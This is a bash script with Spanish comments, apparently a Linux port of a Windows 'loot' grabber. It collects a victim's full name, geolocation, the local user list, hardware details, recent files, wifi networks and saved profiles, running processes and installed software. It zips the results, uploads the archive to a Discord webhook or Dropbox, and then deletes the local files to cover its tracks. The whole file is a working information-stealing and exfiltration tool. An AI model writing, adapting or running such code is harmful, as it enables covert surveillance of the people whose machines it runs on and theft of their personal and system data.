#!/bin/bash

# Ocultar ventana de terminal (no aplicable en bash)

# Crear carpeta de loot
FolderName="${USER}-LOOT-$(date +%Y-%m-%d_%H-%M)"
FileName="${FolderName}.txt"
ZIP="${FolderName}.zip"
mkdir -p /tmp/$FolderName

# Guardar información del sistema en un archivo
output="/tmp/$FolderName/computerData.txt"

# Obtener nombre completo del usuario
fullName=$(getent passwd "$USER" | cut -d ':' -f 5)

# Obtener dirección de correo del propietario del sistema (en Linux esto no es tan directo)
email="No Email Detected"

# Obtener geolocalización (necesita acceso a un servicio externo)
GeoLocation=$(curl -s https://ipinfo.io/loc)
Lat=$(echo $GeoLocation | cut -d ',' -f 1)
Lon=$(echo $GeoLocation | cut -d ',' -f 2)

# Obtener lista de usuarios locales
luser=$(cat /etc/passwd)

# Obtener estado de UAC (no aplicable en Linux)
UAC="Not applicable in Linux"

# Obtener estado de LSASS (no aplicable en Linux)
lsass="Not applicable in Linux"

# Verificar si RDP está habilitado (no aplicable en Linux)
RDP="Not applicable in Linux"

# Obtener IP pública y local
computerPubIP=$(curl -s https://ipinfo.io/ip)
localIP=$(hostname -I)

# Obtener dirección MAC
MAC=$(ip link show | grep link/ether | awk '{print $2}')

# Obtener información del sistema
computerName=$(hostname)
computerModel=$(sudo dmidecode -s system-product-name)
computerManufacturer=$(sudo dmidecode -s system-manufacturer)
computerBIOS=$(sudo dmidecode -t bios)
computerOs=$(lsb_release -d)
computerCpu=$(lscpu)
computerRam=$(free -h)
videocard=$(lspci | grep VGA)

# Obtener tareas programadas (crontab)
ScheduledTasks=$(crontab -l)

# Obtener sesiones de usuario
klist=$(w -h)

# Obtener archivos recientes
RecentFiles=$(find $HOME -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r | head -n 50)

# Obtener discos duros
Hdds=$(lsblk)

# Obtener dispositivos conectados por USB
COMDevices=$(lsusb)

# Obtener adaptadores de red
NetworkAdapters=$(ip -br address)

# Obtener redes wifi cercanas
NearbyWifi=$(nmcli dev wifi list)

# Obtener perfiles wifi guardados (NetworkManager)
wifiProfiles=$(nmcli connection show)

# Obtener procesos en ejecución
process=$(ps aux)

# Obtener conexiones activas
listener=$(ss -tuln)

# Obtener servicios (systemd)
service=$(systemctl list-units --type=service --state=running)

# Obtener software instalado
software=$(dpkg-query -l)

# Obtener drivers (módulos de kernel)
drivers=$(lsmod)

# Escribir toda la información recolectada en el archivo de salida
cat <<EOF > $output
Full Name: $fullName

Email: $email

GeoLocation:
Latitude:  $Lat
Longitude: $Lon

------------------------------------------------------------------------------------------------------------------------------

Local Users:
$luser

------------------------------------------------------------------------------------------------------------------------------

UAC State:
$UAC

LSASS State:
$lsass

RDP State:
$RDP

------------------------------------------------------------------------------------------------------------------------------

Public IP:
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

------------------------------------------------------------------------------------------------------------------------------

Computer Name:
$computerName

Model:
$computerModel

Manufacturer:
$computerManufacturer

BIOS:
$computerBIOS

OS:
$computerOs

CPU:
$computerCpu

RAM:
$computerRam

Video Card:
$videocard

------------------------------------------------------------------------------------------------------------------------------

Scheduled Tasks:
$ScheduledTasks

------------------------------------------------------------------------------------------------------------------------------

Logon Sessions:
$klist

------------------------------------------------------------------------------------------------------------------------------

Recent Files:
$RecentFiles

------------------------------------------------------------------------------------------------------------------------------

Hard-Drives:
$Hdds

COM Devices:
$COMDevices

------------------------------------------------------------------------------------------------------------------------------

Network Adapters:
$NetworkAdapters

------------------------------------------------------------------------------------------------------------------------------

Nearby Wifi:
$NearbyWifi

Wifi Profiles:
$wifiProfiles

------------------------------------------------------------------------------------------------------------------------------

Process:
$process

------------------------------------------------------------------------------------------------------------------------------

Listeners:
$listener

------------------------------------------------------------------------------------------------------------------------------

Services:
$service

------------------------------------------------------------------------------------------------------------------------------

Installed Software:
$software

------------------------------------------------------------------------------------------------------------------------------

Drivers:
$drivers

------------------------------------------------------------------------------------------------------------------------------
EOF

# Comprimir carpeta de loot
zip -r /tmp/$ZIP /tmp/$FolderName

# Subir archivo a Dropbox (requiere token de acceso)
upload_to_dropbox() {
    local file_path=$1
    local target_path="/$(basename "$file_path")"
    local access_token="YOUR_DROPBOX_ACCESS_TOKEN"

    curl -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer $access_token" \
        --header "Dropbox-API-Arg: {\"path\": \"$target_path\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @"$file_path"
}

# Subir archivo a Discord (requiere webhook URL)
upload_to_discord() {
    local file_path=$1
    local webhook_url="YOUR_DISCORD_WEBHOOK_URL"

    curl -F "file1=@$file_path" $webhook_url
}

# Llamar funciones de subida (comentar/descomentar según necesidad)
# upload_to_dropbox "/tmp/$ZIP"
upload_to_discord "/tmp/$ZIP"

# Limpiar archivos temporales
rm -rf /tmp/$FolderName /tmp/$ZIP

# Mensaje de completado (en terminal)
echo "Proceso completado"
